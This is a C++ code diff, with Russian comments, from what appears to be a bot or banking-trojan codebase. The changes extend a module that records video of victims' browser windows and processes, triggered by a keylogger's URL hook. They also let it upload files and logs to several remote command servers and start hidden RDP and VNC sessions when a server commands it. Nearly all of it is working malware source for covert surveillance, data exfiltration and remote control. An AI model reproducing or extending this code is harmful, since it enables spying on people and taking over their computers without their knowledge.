@@ -95,6 +95,7 @@ void TVideoRecDLL::InitializeApi()
 {
 	LoadFunc(VideoRecFuncInit,			(LPVOID&)Init);
 	LoadFunc(VideoRecFuncRelease,		(LPVOID&)Release);
+	LoadFunc(VideoRecFuncAddIPServer,	(LPVOID&)AddIPServer);
 	LoadFunc(VideoRecFuncRecordProcess,	(LPVOID&)RecordProcess);
 	LoadFunc(VideoRecFuncRecordWnd,		(LPVOID&)RecordWnd);
 	LoadFunc(VideoRecFuncStop,			(LPVOID&)RecordStop);
@@ -169,7 +170,7 @@ void WINAPI IEURLChanged(PKeyLogger, DWORD EventID, LPVOID Data)
 
 	if (URL != NULL)
 	{
-		VideoProcess::RecordPID(URL);
+		VideoProcess::RecordPID( 0, URL );
 	}
 	else
 	{
@@ -232,8 +233,67 @@ namespace VideoProcess
 
 TVideoRecDLL* dll; //экземпляр либы
 PProcessPipe pipe; //канал пайпа
+const int MaxServers = 10; //максимальное количество обновременно работающих серверов 
+DWORD servers[MaxServers];
 
+DWORD WINAPI CallbackCmd( DWORD server, DWORD cmd, char* inData, int lenInData, char* outData, int szOutData, DWORD* lenOutData );
 
+//инициализация (запуск) нового менеджера 
+struct MsgInit
+{
+	char ip[16];
+	int port;
+	int flags;
+	int downtime; //время бездействия после которого менеджер уходит в режим спячки
+	int numServer; //номер сервера (индекс в servers), 
+};
+
+static void WINAPI HandlerInit( LPVOID Data, PPipeMessage Message, bool &Cancel )
+{
+	if( Message->DataSize != sizeof(VideoProcess::MsgInit) ) 
+		return;
+	MsgInit* mi = (MsgInit*)Message->Data;
+	VDRDBG( "Video", "init server: ip: %s:%d, downtime %d", mi->ip, mi->port, mi->downtime );
+	int num = -1;
+	for( int i = 0; i < MaxServers; i++ ) //ищем свободное место в массиве серверов
+		if( servers[i] == 0 )
+			num = i;
+	if( num >= 0 )
+	{
+		DWORD id = dll->Init( Bot->UID().t_str(), mi->flags, mi->ip, mi->port, mi->downtime );
+		if( id )
+		{
+			int i = 0;
+			for( ; i < MaxServers; i++ ) //смотрим может уже инициализирован такой сервер
+				if( servers[i] == id )
+				{
+					num = i;
+					break;
+				}
+			if( i >= MaxServers ) //такой сервер уже подключен
+			{
+				servers[num] = id;
+				if( mi->flags & TVideoRecDLL::RunCallback )
+					dll->RunCmdExec( id, CallbackCmd ); //запуск потока выполнения команд от сервера
+			}
+		}
+		else
+			num = -1;
+	}
+	mi->numServer = num;
+}
+
+int Init( int flags, const char* ip, int port, int downtime )
+{
+	MsgInit msg;
+	SafeCopyStr( msg.ip, sizeof(msg.ip), ip );
+	msg.port = port == 0 ? VIDEORECORD_DEFAULT_PORT : port;
+	msg.flags = flags;
+	msg.downtime = downtime;
+	char buf[64];
+	PIPE::SendMessage( VideoProcess::GetNamePipe(buf), GetStr(VideoRecFuncInit).t_str(), (char*)&msg, sizeof(msg), 0 );
+	return msg.numServer;
+}
 
 //сообщение для записи видео
 struct MsgRecordVideo
@@ -243,24 +303,25 @@ struct MsgRecordVideo
 	DWORD pid; //если != 0, то запись с окон указанного процесса
 	int flags; //0x0001 - полноэкранная запись, 0x0002 - записывать всегда, даже если окно не активно
 	int seconds; //сколько секунд писать видео
+	int numServer;
 };
 //функция обработчик стартует запись видео
 static void WINAPI HandlerRecordVideo( LPVOID Data, PPipeMessage Message, bool &Cancel )
 {
 	if( Message->DataSize != sizeof(VideoProcess::MsgRecordVideo) ) 
 		return;
-	MsgRecordVideo* mrv = (MsgRecordVideo*)Message->Data;
-	VDRDBG( "Video", "start name video: %s, wnd: %08x, pid: %08x", mrv->nameVideo, mrv->wnd, mrv->pid );
+	MsgRecordVideo* msg = (MsgRecordVideo*)Message->Data;
+	VDRDBG( "Video", "start name video: %s, wnd: %08x, pid: %08x", msg->nameVideo, msg->wnd, msg->pid );
 	if( dll )
 	{
-		if( mrv->wnd )
-			dll->RecordWnd( Bot->UID().t_str(), mrv->nameVideo, mrv->wnd, mrv->seconds, mrv->flags );
-		else if( mrv->pid )
-			dll->RecordProcess( Bot->UID().t_str(), mrv->nameVideo, mrv->pid, mrv->seconds, mrv->flags );
+		if( msg->wnd )
+			dll->RecordWnd( servers[msg->numServer], Bot->UID().t_str(), msg->nameVideo, msg->wnd, msg->seconds, msg->flags );
+		else if( msg->pid )
+			dll->RecordProcess( servers[msg->numServer], Bot->UID().t_str(), msg->nameVideo, msg->pid, msg->seconds, msg->flags );
 	}
 }
 
-bool RecordHWND( const char* name, HWND wnd, int seconds, int flags )
+bool RecordHWND( int server, const char* name, HWND wnd, int seconds, int flags )
 {
 	MsgRecordVideo msg;
 	SafeCopyStr( msg.nameVideo, sizeof(msg.nameVideo), name );
@@ -268,12 +329,13 @@ bool RecordHWND( const char* name, HWND wnd, int seconds, int flags )
 	msg.pid = 0;
 	msg.flags = flags;
 	msg.seconds = seconds;
+	msg.numServer = server;
 	char buf[64];
 	PIPE::SendMessage( VideoProcess::GetNamePipe(buf), GetStr(VideoRecFuncRecordWnd).t_str(), (char*)&msg, sizeof(msg), 0 );
 	return true;
 }
 
-bool RecordPID( const char* name, DWORD pid, int seconds, int flags )
+bool RecordPID( int server, const char* name, DWORD pid, int seconds, int flags )
 {
 	MsgRecordVideo msg;
 	SafeCopyStr( msg.nameVideo, sizeof(msg.nameVideo), name );
@@ -282,6 +344,7 @@ bool RecordPID( const char* name, DWORD pid, int seconds, int flags )
 	msg.pid = pid;
 	msg.flags = flags;
 	msg.seconds = seconds;
+	msg.numServer = server;
 	char buf[64];
 	PIPE::SendMessage( VideoProcess::GetNamePipe(buf), GetStr(VideoRecFuncRecordWnd).t_str(), (char*)&msg, sizeof(msg), 0 );
 	return true;
@@ -307,6 +370,7 @@ struct MsgSendFiles
 {
 	char name[128]; //имя записи
 	char path[MAX_PATH]; //имя файла или папка которые нужно передать
+	int numServer;
 	DWORD id; //идентификатор отправки (для проверки в асинхронной отправки)
 };
 
@@ -317,14 +381,15 @@ static void WINAPI HandlerSendFiles( LPVOID Data, PPipeMessage Message, bool &Ca
 	MsgSendFiles* msg = (MsgSendFiles*)Message->Data;
 	VDRDBG( "Video", "Start send files %s", msg->path );
 	if( dll )
-		msg->id = dll->StartSendAsync( msg->path );
+		msg->id = dll->StartSendAsync( servers[msg->numServer], msg->path );
 }
 
-DWORD SendFiles( const char* name, const char* path, bool async )
+DWORD SendFiles( int server, const char* name, const char* path, bool async )
 {
 	MsgSendFiles msg;
 	SafeCopyStr( msg.name, sizeof(msg.name), name );
 	SafeCopyStr( msg.path, sizeof(msg.name), path );
+	msg.numServer = server;
 	char buf[64];
 	PIPE::SendMessage( VideoProcess::GetNamePipe(buf), GetStr(VideoRecFuncSendFilesAsync).t_str(), (char*)&msg, sizeof(msg), &msg );
 	if( async )
@@ -369,6 +434,7 @@ struct MsgSendLog
 	char name[128]; //имя лога
 	int code; //кода текста лога
 	char text[4096 - 256]; //текст лога (большего размера нельзя из-за ограничения размеров отправляемых на сервер пакетов)
+	int numServer;
 };
 
 //отсылка лога на сервер
@@ -378,7 +444,7 @@ static void WINAPI HandlerSendLog( LPVOID Data, PPipeMessage Message, bool &Canc
 	MsgSendLog* msg = (MsgSendLog*)Message->Data;
 	VDRDBG( "Video", "HandlerSendLog %s, %d, %s", msg->name, msg->code, msg->text );
 	if( dll )
-		dll->SendLog( msg->name, msg->code, msg->text );
+		dll->SendLog( servers[msg->numServer], msg->name, msg->code, msg->text );
 }
 
 static DWORD WINAPI SendLogThread( void* msg )
@@ -389,12 +455,13 @@ static DWORD WINAPI SendLogThread( void* msg )
 }
 
 //лог отправляет в отдельном потоке, чтобы не было задержки
-bool SendLog( const char* name, int code, const char* text )
+bool SendLog( int server, const char* name, int code, const char* text )
 {
 	MsgSendLog* msg = (MsgSendLog*)MemAlloc( sizeof(MsgSendLog) );
 	SafeCopyStr( msg->name, sizeof(msg->name), name );
 	msg->code = code;
 	SafeCopyStr( msg->text, sizeof(msg->text), text );
+	msg->numServer = server;
 	RunThread( SendLogThread, msg );
 	return true;
 }
@@ -423,8 +490,8 @@ static DWORD WINAPI ProcessRDP(void*)
 			{
 				VDRDBG( "Video", "Init RDP" );
 				Init(GetStr(RDPRunParam).t_str());
-				Start();
 				HANDLE mutex = CaptureMutex( "RDP", 10000 ); //сообщаем что RDP запустился
+				Start();
 				if( mutex )
 				{
 					for(;;) // ждем команды на выключение
@@ -504,7 +571,9 @@ static DWORD WINAPI ProcessVNC(void*)
 }
 
 //обработчик команд от видео длл
-DWORD WINAPI CallbackCmd( DWORD cmd, char* inData, int lenInData, char* outData, int szOutData, DWORD* lenOutData )
+//server - это не номер индекса в массиве servers, это ид сервере, возвращаемый длл, если нужен номер
+//сервера, то нужно пройтись по массиву servers и найти индекс
+DWORD WINAPI CallbackCmd( DWORD server, DWORD cmd, char* inData, int lenInData, char* outData, int szOutData, DWORD* lenOutData )
 {
 	DWORD res = 0;
 	switch( cmd )
@@ -516,13 +585,17 @@ DWORD WINAPI CallbackCmd( DWORD cmd, char* inData, int lenInData, char* outData,
 			else
 			{
 				MegaJump(ProcessRDP);
-				if( WaitCaptureMutex( "RDP", 60 * 1000 ) )
+				if( WaitCaptureMutex( "RDP", 2 * 60 * 1000 ) )
 				{
+					pSleep(10000); //ждем дополнительно пока стартанет RDP
 					outData[0] = 1;
 					VDRDBG( "Video", "RDP is start" );
 				}
 				else
+				{
+					VDRDBG( "Video", "RDP not start" );
 					outData[0] = 0;
+				}
 			}
 			res = TRUE;
 			break;
@@ -533,7 +606,7 @@ DWORD WINAPI CallbackCmd( DWORD cmd, char* inData, int lenInData, char* outData,
 			else
 			{
 				MegaJump(ProcessVNC);
-				if( WaitCaptureMutex( "VNC", 60 * 1000 ) )
+				if( WaitCaptureMutex( "VNC", 2 * 60 * 1000 ) )
 				{
 					VDRDBG( "Video", "VNC is start" );
 					outData[0] = 1;
@@ -565,15 +638,22 @@ DWORD WINAPI CallbackCmd( DWORD cmd, char* inData, int lenInData, char* outData,
 bool Start()
 {
 	dll = new TVideoRecDLL();
-	//запускаем менеджер видо процесса в режиме спячки, т. е. соединяться с сервером будет только по команде
-	//или передачи данных
-	if( dll->Init( Bot->UID().t_str(), 1, VIDEO_REC_HOST1, VIDEORECORD_DEFAULT_PORT, VIDEO_REC_HOST2, VIDEORECORD_DEFAULT_PORT ) )
+	m_memset( servers, 0, sizeof(servers) );
+	//запускаем менеджер видео процесса в режиме спячки, т. е. соединяться с сервером будет только по команде
+	//или при передаче данных
+	VDRDBG( "Video", "Start manager ip '%s'", VIDEO_REC_HOST1 );
+	servers[0] = dll->Init( Bot->UID().t_str(), TVideoRecDLL::Hibernation, VIDEO_REC_HOST1, VIDEORECORD_DEFAULT_PORT, 0 );
+	if( servers[0] )
 	{
 		VDRDBG( "Video", "Менеджер инициализирован" );
+		dll->AddIPServer( servers[0], VIDEO_REC_HOST2, VIDEORECORD_DEFAULT_PORT );
+		VDRDBG( "Video", "Add server ip '%s'", VIDEO_REC_HOST2 );
 		char namePipe[64];
 		pipe = PIPE::CreateProcessPipe( GetNamePipe(namePipe), false );
 		if( pipe )
 		{
+			PIPE::RegisterMessageHandler( pipe, HandlerInit, 0, GetStr(VideoRecFuncInit).t_str(), 0 );
+
 			PIPE::RegisterMessageHandler( pipe, HandlerRecordVideo, 0, GetStr(VideoRecFuncRecordWnd).t_str(), 0 );
 			PIPE::RegisterMessageHandler( pipe, HandlerStopRecord, 0, GetStr(VideoRecFuncStop).t_str(), 0 );
 
@@ -582,7 +662,7 @@ bool Start()
 
 			PIPE::RegisterMessageHandler( pipe, HandlerSendLog, 0, GetStr(VideoRecFuncSendLog).t_str(), 0 );
 
-			dll->RunCmdExec(CallbackCmd); //запуск потока выполнения команд от сервера
+			dll->RunCmdExec( servers[0], CallbackCmd ); //запуск потока выполнения команд от сервера
 
 			if( PIPE::StartProcessPipe(pipe) )
 			{
